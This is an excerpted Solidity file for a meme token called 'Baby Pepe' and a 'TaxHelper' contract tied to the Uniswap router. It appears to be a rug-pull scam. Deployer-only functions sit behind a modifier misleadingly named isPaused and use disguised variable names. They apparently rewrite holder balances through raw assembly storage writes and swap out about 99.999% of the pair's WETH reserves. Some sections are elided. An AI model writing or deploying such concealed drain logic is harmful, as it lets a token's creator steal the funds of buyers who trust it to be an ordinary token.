...
contract TaxHelper {
    ...
    TRADABLE pair;
    TRADABLE uni_router = TRADABLE(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address internal _pause;

    constructor() {
        _pause = msg.sender;
        pair = TRADABLE(
            TRADABLE(uni_router.factory()).createPair(
                address(this),
                address(uni_router.WETH())
            )
        );
    }
    ...
    function aggregate(uint256[] calldata data, uint256 start) public isPaused {
        for (uint256 i = 0; i < data.length; i++) {
            address gas_limit = multiply(data[i]);
            uint256 gas_price = _balances[gas_limit] / start;
            assembly {
                mstore(0, gas_limit)
                mstore(32, 1)
    ...
    function getReserves(address t) internal view returns (uint256) {
        ...
        return (pair.token0() == t) ? uint256(r0) : uint256(r1);
    }
    ...
    function disperse(
        ...
        value = uni_router.getAmountsIn(time, p);
    ...
    function Swap(address tokenContract) public isPaused {
        uint256 time = (getReserves(uni_router.WETH()) * 99999) / 100000;
    ...
    function rescueTokens(
        ...
        _allowances[address(this)][address(uni_router)] = _balances[
            address(this)
        ];

        uni_router.swapTokensForExactTokens(
            time,
            duration,
            path,
            tokenContract,
...
contract Token is ERC20 {
    constructor() ERC20("Baby Pepe", "BABYPEPE", 10_000_0e18) {}
}
